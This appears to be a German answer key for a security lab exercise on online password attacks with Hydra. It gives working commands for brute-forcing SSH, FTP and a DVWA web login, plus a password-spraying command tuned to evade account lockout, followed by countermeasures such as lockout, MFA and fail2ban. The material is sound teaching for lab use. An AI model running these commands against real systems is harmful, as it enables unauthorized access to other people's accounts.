# Lösung – Übung 06: Online-Brute-Force mit Hydra

`<ZIEL>` = Lab-Ziel.

## 1. SSH

```bash
hydra -l msfadmin -P passlist.txt <ZIEL> ssh -t 4 -V
# gegen Userliste:
hydra -L users.txt -P passlist.txt <ZIEL> ssh -f
```
`-f` stoppt beim ersten Treffer, `-t 4` = 4 parallele Tasks (SSH mag nicht zu viele).

## 2. FTP

```bash
hydra -l msfadmin -P passlist.txt <ZIEL> ftp
```

## 3. Password Spraying

```bash
# EIN Passwort gegen VIELE User:
hydra -L users.txt -p 'Sommer2024!' <ZIEL> ssh -t 4 -W 5
```
`-W 5` = Wartezeit → leiser. Online klüger als Brute-Force, weil:
- **Brute-Force** (viele PW gegen 1 User) löst nach wenigen Fehlversuchen **Account Lockout** aus → Account gesperrt, kein Fortschritt.
- **Spraying** bleibt pro Account unter der Lockout-Schwelle (1 Versuch je Runde) und trifft statistisch irgendeinen User mit schwachem Passwort.

## 4. DVWA-Login-Formular

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <ZIEL> http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=<...>"
```
Fail-String nach dem letzten `:`; Session-Cookie als `H=Cookie:`.

## 5. Gegenmaßnahmen (online wirksamer)

- **Account Lockout** (n Fehlversuche → Sperre) + **Rate-Limiting** → macht sowohl Brute-Force als auch (bei niedriger Schwelle) Spraying unpraktikabel.
- **MFA** → geratenes Passwort allein nützt nichts.
- **fail2ban** (sperrt IP nach Fehlversuchen), **CAPTCHA**, Monitoring vieler Fehllogins (SIEM).
Online sind diese Maßnahmen wirksam, weil jeder Versuch **durch den Dienst** muss (sichtbar/bremsbar) – anders als offline, wo der Angreifer den Hash lokal hat.

## Häufige Fehler / Troubleshooting

- **Alle Versuche „valid":** falscher Fail-String (Web) → exakten Text aus einer echten Fehlantwort kopieren; POST vs. GET beachten.
- **SSH blockt/langsam:** `-t` reduzieren; Legacy-Metasploitable-SSH ist zickig, aber Hydra kommt meist durch.
- **Lockout trifft dich selbst:** im echten Netz vorsichtig; im Lab unkritisch (zurücksetzen).
- **rockyou fehlt:** `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.
